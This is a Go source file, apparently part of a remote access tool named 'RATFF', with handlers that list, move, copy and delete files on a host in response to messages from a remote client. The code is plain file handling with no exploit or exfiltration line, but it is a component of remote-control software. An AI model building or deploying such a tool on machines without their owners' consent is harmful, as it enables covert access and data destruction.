package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"RATFF/shared"
)

func handleFileList(msg shared.Message) shared.Message {
	path, _ := msg.Payload["path"].(string)

	if path == "" {
		workingMu.RLock()
		if workingDir != "" {
			path = workingDir
		} else {
			var err error
			path, err = os.Getwd()
			if err != nil {
				workingMu.RUnlock()
				return shared.NewMessage(shared.MsgError, shared.CmdFileList, msg.ClientID,
					map[string]interface{}{"error": "get current directory failed: " + err.Error()})
			}
		}
		workingMu.RUnlock()
	}

	path = filepath.Clean(path)

	entries, err := os.ReadDir(path)
	if err != nil {
		return shared.NewMessage(shared.MsgError, shared.CmdFileList, msg.ClientID,
			map[string]interface{}{"error": "read directory failed: " + err.Error()})
	}

	files := make([]map[string]interface{}, 0, len(entries))
	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}

		fileInfo := map[string]interface{}{
			"name":        entry.Name(),
			"size":        info.Size(),
			"is_dir":      entry.IsDir(),
			"mod_time":    info.ModTime().Unix(),
			"permissions": info.Mode().String(),
			"hidden":      isHidden(entry.Name()),
		}

		fileType := getFileType(entry, info)
		fileInfo["type"] = fileType

		if fileType == "symlink" {
			target, err := os.Readlink(filepath.Join(path, entry.Name()))
			if err == nil {
				fileInfo["link_target"] = target
			}
		}

		if fileType == "shortcut" {
			target := getShortcutTarget(filepath.Join(path, entry.Name()))
			if target != "" {
				fileInfo["link_target"] = target
			}
		}

		files = append(files, fileInfo)
	}

	return shared.NewMessage(shared.MsgResponse, shared.CmdFileList, msg.ClientID,
		map[string]interface{}{
			"path":  path,
			"files": files,
		})
}

func handleFileMove(msg shared.Message) shared.Message {
	originPath, _ := msg.Payload["origin_path"].(string)
	newPath, _ := msg.Payload["new_path"].(string)

	if originPath == "" {
		return shared.NewMessage(shared.MsgError, shared.CmdFileMove, msg.ClientID,
			map[string]interface{}{"error": "origin_path is required"})
	}

	if newPath == "" {
		return shared.NewMessage(shared.MsgError, shared.CmdFileMove, msg.ClientID,
			map[string]interface{}{"error": "new_path is required"})
	}

	originPath = filepath.Clean(originPath)

	_, err := os.Stat(originPath)
	if err != nil {
		return shared.NewMessage(shared.MsgError, shared.CmdFileMove, msg.ClientID,
			map[string]interface{}{"error": "origin path not found: " + err.Error()})
	}

	newPath = filepath.Clean(newPath)

	destInfo, err := os.Stat(newPath)
	if err == nil && destInfo.IsDir() {
		filename := filepath.Base(originPath)
		newPath = filepath.Join(newPath, filename)
	}

	err = moveFileOrDir(originPath, newPath)
	if err != nil {
		return shared.NewMessage(shared.MsgError, shared.CmdFileMove, msg.ClientID,
			map[string]interface{}{"error": "move failed: " + err.Error()})
	}

	return shared.NewMessage(shared.MsgResponse, shared.CmdFileMove, msg.ClientID,
		map[string]interface{}{
			"origin_path": originPath,
			"new_path":    newPath,
		})
}

func moveFileOrDir(src, dst string) error {
	err := os.Rename(src, dst)
	if err == nil {
		return nil
	}

	if isCrossDeviceError(err) {
		return copyAndRemove(src, dst)
	}

	return err
}

func isCrossDeviceError(err error) bool {
	if le, ok := err.(*os.LinkError); ok {
		return le.Err.Error() == "invalid cross-device link"
	}
	return strings.Contains(err.Error(), "invalid cross-device link") ||
		strings.Contains(err.Error(), "cross-device link")
}

func copyAndRemove(src, dst string) error {
	srcInfo, err := os.Stat(src)
	if err != nil {
		return err
	}

	if srcInfo.IsDir() {
		return copyDir(src, dst)
	}
	return copyFile(src, dst)
}

func copyFile(src, dst string) error {
	srcFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	dstFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer dstFile.Close()

	_, err = io.Copy(dstFile, srcFile)
	if err != nil {
		return err
	}

	srcInfo, err := os.Stat(src)
	if err != nil {
		return err
	}

	if err := os.Chmod(dst, srcInfo.Mode()); err != nil {
		return fmt.Errorf("chmod failed: %v", err)
	}
	return os.Remove(src)
}

func copyDir(src, dst string) error {
	srcInfo, err := os.Stat(src)
	if err != nil {
		return err
	}

	err = os.MkdirAll(dst, srcInfo.Mode())
	if err != nil {
		return err
	}

	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())

		if entry.IsDir() {
			err = copyDir(srcPath, dstPath)
		} else {
			err = copyFile(srcPath, dstPath)
		}
		if err != nil {
			return err
		}
	}

	return os.RemoveAll(src)
}

func handleFileCopy(msg shared.Message) shared.Message {
	originPath, _ := msg.Payload["origin_path"].(string)
	newPath, _ := msg.Payload["new_path"].(string)

	if originPath == "" {
		return shared.NewMessage(shared.MsgError, shared.CmdFileCopy, msg.ClientID,
			map[string]interface{}{"error": "origin_path is required"})
	}

	if newPath == "" {
		return shared.NewMessage(shared.MsgError, shared.CmdFileCopy, msg.ClientID,
			map[string]interface{}{"error": "new_path is required"})
	}

	originPath = filepath.Clean(originPath)

	srcInfo, err := os.Stat(originPath)
	if err != nil {
		return shared.NewMessage(shared.MsgError, shared.CmdFileCopy, msg.ClientID,
			map[string]interface{}{"error": "origin path not found: " + err.Error()})
	}

	newPath = filepath.Clean(newPath)

	destInfo, err := os.Stat(newPath)
	if err == nil && destInfo.IsDir() {
		filename := filepath.Base(originPath)
		newPath = filepath.Join(newPath, filename)
	}

	if srcInfo.IsDir() {
		err = copyDirOnly(originPath, newPath)
	} else {
		err = copyFileOnly(originPath, newPath)
	}

	if err != nil {
		return shared.NewMessage(shared.MsgError, shared.CmdFileCopy, msg.ClientID,
			map[string]interface{}{"error": "copy failed: " + err.Error()})
	}

	return shared.NewMessage(shared.MsgResponse, shared.CmdFileCopy, msg.ClientID,
		map[string]interface{}{
			"origin_path": originPath,
			"new_path":    newPath,
		})
}

func copyFileOnly(src, dst string) error {
	srcFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	dstFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer dstFile.Close()

	_, err = io.Copy(dstFile, srcFile)
	if err != nil {
		return err
	}

	srcInfo, err := os.Stat(src)
	if err != nil {
		return err
	}

	return os.Chmod(dst, srcInfo.Mode())
}

func copyDirOnly(src, dst string) error {
	srcInfo, err := os.Stat(src)
	if err != nil {
		return err
	}

	err = os.MkdirAll(dst, srcInfo.Mode())
	if err != nil {
		return err
	}

	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())

		if entry.IsDir() {
			err = copyDirOnly(srcPath, dstPath)
		} else {
			err = copyFileOnly(srcPath, dstPath)
		}
		if err != nil {
			return err
		}
	}

	return nil
}

func handleFileDelete(msg shared.Message) shared.Message {
	path, _ := msg.Payload["path"].(string)

	if path == "" {
		return shared.NewMessage(shared.MsgError, shared.CmdFileDelete, msg.ClientID,
			map[string]interface{}{"error": "path is required"})
	}

	path = filepath.Clean(path)

	info, err := os.Stat(path)
	if err != nil {
		return shared.NewMessage(shared.MsgError, shared.CmdFileDelete, msg.ClientID,
			map[string]interface{}{"error": "path not found: " + err.Error()})
	}

	if info.IsDir() {
		err = os.RemoveAll(path)
	} else {
		err = os.Remove(path)
	}

	if err != nil {
		return shared.NewMessage(shared.MsgError, shared.CmdFileDelete, msg.ClientID,
			map[string]interface{}{"error": "delete failed: " + err.Error()})
	}

	return shared.NewMessage(shared.MsgResponse, shared.CmdFileDelete, msg.ClientID,
		map[string]interface{}{
			"path": path,
		})
}

func isHidden(name string) bool {
	if runtime.GOOS == "windows" {
		return false
	}
	return strings.HasPrefix(name, ".")
}

func getFileType(entry os.DirEntry, info os.FileInfo) string {
	if info.Mode()&os.ModeSymlink != 0 {
		return "symlink"
	}

	if runtime.GOOS == "windows" && strings.HasSuffix(strings.ToLower(entry.Name()), ".lnk") {
		return "shortcut"
	}

	if entry.IsDir() {
		return "directory"
	}

	return "file"
}

func getShortcutTarget(path string) string {
	if runtime.GOOS != "windows" {
		return ""
	}

	// Escape single quotes to prevent command injection
	escapedPath := strings.ReplaceAll(path, "'", "''")

	cmd := exec.Command("powershell", "-Command",
		"(New-Object -ComObject WScript.Shell).CreateShortcut('"+escapedPath+"').TargetPath")

	output, err := cmd.Output()
	if err != nil {
		return ""
	}

	return strings.TrimSpace(string(output))
}
